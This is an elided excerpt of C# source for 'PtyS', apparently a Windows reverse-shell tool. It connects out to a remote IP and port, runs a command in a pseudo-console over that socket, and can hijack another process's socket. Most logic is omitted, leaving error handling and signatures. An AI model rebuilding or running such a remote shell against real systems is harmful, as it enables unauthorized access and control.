...
public class PtySException : Exception
{
    private const string error_string = "[-] PtySException: ";

    public PtySException() { }

    public PtySException(string message) : base(error_string + message) { }
}
...
public static class SocketHj
{
    ...
    public static IntPtr DuplicateTargetProcessSocket(Process targetProcess)
    {
        ...
        if (targetSocketHandle == IntPtr.Zero)
            throw new PtySException("No overlapped sockets found, so no hijackable sockets found :( Exiting...");
...
public struct ParentProcessUtilities
{
    ...
    public static Process GetParentProcess(IntPtr handle)
    {
        ...
        if (status != 0)
            throw new PtySException(status.ToString());
        try
        {
...
{
    private const string errorString = "{{{PtySException}}}\r\n";
    ...
    private static void InitWSAThread()
    {
        ...
        if (WSAStartup(2 << 8 | 2, out data) != 0)
            throw new PtySException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
    }
    ...
    private static IntPtr connectRemote(string remoteIp, int remotePort)
    {
        ...
        {
            throw new PtySException("Specified port is invalid: " + remotePort.ToString());
        }
        ...
        if (connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0)
        {
            ...
            throw new PtySException(String.Format("WSAConnect failed with error code: {0}", error));
        }
    ...
    private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite)
    {
        ...
        if (!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new PtySException("Could not create the InputPipe");
        if (!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new PtySException("Could not create the OutputPipe");
    }
    ...
    private static void EnableVirtualTerminalSequenceProcessing()
    {
        ...
        {
            throw new PtySException("Could not get console mode");
        }
        outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
        if (!SetConsoleMode(hStdOut, outConsoleMode))
        {
            throw new PtySException("Could not enable virtual terminal processing");
        }
    }
    ...
    private static STARTUPINFOEX ConfigureProcessThread(IntPtr handlePseudoConsole, IntPtr attributes)
    {
        ...
        {
            throw new PtySException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
        }
        ...
        if (!success)
        {
            throw new PtySException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
        }
        ...
        if (!success)
        {
            throw new PtySException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
        }
        return startupInfo;
    }
    ...
    private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)
    {
        ...
        if (!success)
        {
            throw new PtySException("Could not create process. " + Marshal.GetLastWin32Error());
        }
        return pInfo;
    }
    ...
    public static string SpawnPtyS(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
    {
            ...
            if (upgradeShell)
            {
                ...
                if (shellSocket == IntPtr.Zero && parentProcess != null) {
                    ...
                    if (shellSocket == IntPtr.Zero && grandParentProcess != null)
                    {
                        ...
                        {
                            throw new PtySException("No \\Device\\Afd objects found. Socket duplication failed.");
                        }
                        else {
        ...
        output += "PtyS kindly exited.\r\n";
        return output;
    }
}

public static class PtySMainClass
{
    ...
    private static void CheckArgs(string[] arguments)
    {
        if (arguments.Length < 2)
            throw new PtySException("\r\nPtyS: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
    }
    ...
    private static string CheckRemoteIpArg(string ipString)
    {
        ...
        if (!IPAddress.TryParse(ipString, out address))
            throw new PtySException("\r\nPtyS: Invalid remoteIp value" + ipString);
        return ipString;
    }
    ...
    private static int CheckInt(string arg)
    {
        ...
        if (!Int32.TryParse(arg, out ret))
            throw new PtySException("\r\nPtyS: Invalid integer value " + arg);
        return ret;
    }
    ...
    public static string PtySMain(string[] args)
    {
        string output = "";
        ...
        else
        {
            ...
            try
            {
                ...
                output = PtyS.SpawnPtyS(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
            }
            catch (Exception e)
            {
                Console.WriteLine("\n" + e.ToString() + "\n");
...
class MainClass
{
    ...
    {
        Console.Out.Write(PtySMainClass.PtySMain(args));
    }
}
